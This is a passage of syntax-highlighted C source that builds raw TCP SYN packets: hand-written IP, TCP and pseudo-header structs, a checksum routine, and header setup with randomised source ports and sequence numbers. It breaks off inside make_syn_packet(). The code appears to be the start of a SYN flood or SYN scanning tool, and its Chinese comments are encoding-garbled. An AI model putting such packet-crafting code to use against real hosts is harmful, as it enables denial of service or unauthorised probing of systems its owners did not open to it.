</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">146
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">147
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">148
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">149
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">150
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">151
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">152
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">153
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">154
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">155
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">156
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">157
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">158
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">159
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">160
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">161
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">162
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">163
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">164
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">165
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">166
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">167
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">168
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">169
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">170
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">171
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">172
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">173
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">174
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">175
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">176
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">177
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">178
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">179
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">180
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">181
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">182
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">183
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">184
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">185
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">186
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">187
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">188
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">189
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">190
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">191
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">192
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">193
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">194
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">195
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">196
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">197
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">198
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">199
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">200
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">201
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">202
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">203
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">204
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">205
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">206
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">207
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">208
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">209
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">210
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">211
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">212
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">213
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">214
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">215
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">216
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">217
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">218
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">219
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">220
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;ctype.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;signal.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/socket.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;netdb.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;errno.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;arpa/inet.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">struct</span> iphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ver_and_hdrlen;<span style="color:#007f7f">// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       tos;           <span style="color:#007f7f">// æœåŠ¡ç±»å‹
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      total_len;     <span style="color:#007f7f">// æ€»é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      id;            <span style="color:#007f7f">// IPåŒ…ID
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      flags;         <span style="color:#007f7f">// æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ttl;           <span style="color:#007f7f">// ç”Ÿå‘½å‘¨æœŸ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       protocol;      <span style="color:#007f7f">// ä¸Šå±‚åè®®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum;      <span style="color:#007f7f">// æ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        srcaddr;       <span style="color:#007f7f">// æºIPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        dstaddr;       <span style="color:#007f7f">// ç›®æ ‡IPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">struct</span> tcphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      sport;    <span style="color:#007f7f">// æºç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      dport;    <span style="color:#007f7f">// ç›®æ ‡ç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        seq;      <span style="color:#007f7f">// åºåˆ—å·
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        ack_seq;  <span style="color:#007f7f">// ç¡®è®¤å·
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       len;      <span style="color:#007f7f">// é¦–éƒ¨é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       flag;     <span style="color:#007f7f">// æ ‡å¿—ä½
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      win;      <span style="color:#007f7f">// çª—å£å¤§å°
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum; <span style="color:#007f7f">// æ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      urg;      <span style="color:#007f7f">// ç´§æ€¥æŒ‡é’ˆ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">struct</span> pseudohdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        saddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        daddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>                zeros;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>                protocol;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      length;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> <span style="color:#fff;font-weight:bold">inline</span>
</span></span><span style="display:flex;"><span>checksum(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> *buffer, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">long</span> cksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">while</span> (size &gt; <span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        cksum += *buffer++;
</span></span><span style="display:flex;"><span>        size  -= <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (size) {
</span></span><span style="display:flex;"><span>        cksum += *(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> *)buffer;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cksum = (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>) + (cksum &amp; <span style="color:#ff0;font-weight:bold">0xffff</span>);
</span></span><span style="display:flex;"><span>    cksum += (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> )(~cksum);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> init_ip_header(<span style="color:#fff;font-weight:bold">struct</span> iphdr *ip, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len = <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr) + <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ip-&gt;ver_and_hdrlen = (<span style="color:#ff0;font-weight:bold">4</span>&lt;&lt;<span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr)/<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>));
</span></span><span style="display:flex;"><span>    ip-&gt;tos = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;total_len = htons(len);
</span></span><span style="display:flex;"><span>    ip-&gt;id = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;flags = <span style="color:#ff0;font-weight:bold">0x40</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;ttl = <span style="color:#ff0;font-weight:bold">255</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    ip-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;srcaddr = srcaddr; <span style="color:#007f7f">// æºIPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip-&gt;dstaddr = dstaddr; <span style="color:#007f7f">// ç›®æ ‡IPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> init_tcp_header(<span style="color:#fff;font-weight:bold">struct</span> tcphdr *tcp, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    tcp-&gt;sport = htons(rand() % <span style="color:#ff0;font-weight:bold">16383</span> + <span style="color:#ff0;font-weight:bold">49152</span>);   <span style="color:#007f7f">// éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;dport = htons(dport);                    <span style="color:#007f7f">// ç›®æ ‡ç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;seq = htonl(rand() % <span style="color:#ff0;font-weight:bold">90000000</span> + <span style="color:#ff0;font-weight:bold">2345</span> );  <span style="color:#007f7f">// éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å·
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;ack_seq = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;len = (<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr) / <span style="color:#ff0;font-weight:bold">4</span> &lt;&lt; <span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#ff0;font-weight:bold">0</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;flag = <span style="color:#ff0;font-weight:bold">0x02</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;win = htons(<span style="color:#ff0;font-weight:bold">1024</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;urg = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> init_pseudo_header(<span style="color:#fff;font-weight:bold">struct</span> pseudohdr *pseudo, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    pseudo-&gt;zeros = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    pseudo-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    pseudo-&gt;length = htons(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr));
</span></span><span style="display:flex;"><span>    pseudo-&gt;saddr = srcaddr;
</span></span><span style="display:flex;"><span>    pseudo-&gt;daddr = dstaddr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_syn_packet(<span style="color:#fff;font-weight:bold">char</span> *packet, <span style="color:#fff;font-weight:bold">int</span> pkt_len, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> daddr,<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> saddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buf[<span style="color:#ff0;font-weight:bold">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> iphdr ip;          <span style="color:#007f7f">//IP å¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> tcphdr tcp;        <span style="color:#007f7f">//TCP å¤´éƒ¨
